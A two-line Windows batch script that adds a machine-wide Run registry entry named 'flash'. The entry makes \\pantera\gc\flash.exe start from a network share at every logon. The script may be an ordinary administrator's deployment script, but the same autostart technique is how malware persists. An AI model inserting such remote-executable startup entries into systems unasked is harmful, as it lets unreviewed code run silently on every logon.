@Echo off
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v flash /t REG_SZ /d "\\pantera\gc\flash.exe"
